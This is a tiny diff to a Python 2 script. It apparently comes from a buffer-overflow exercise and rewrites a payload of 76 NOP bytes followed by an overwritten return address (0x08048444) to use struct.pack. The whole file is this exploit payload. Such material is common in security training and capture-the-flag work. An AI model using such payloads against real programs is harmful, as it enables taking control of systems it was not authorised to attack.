@@ -1,1 +1,3 @@
-print "\x90" * 76 + "\x44\x84\x04\x08"
+import struct
+
+print "\x90" * 76 + struct.pack('I', 0x08048444)
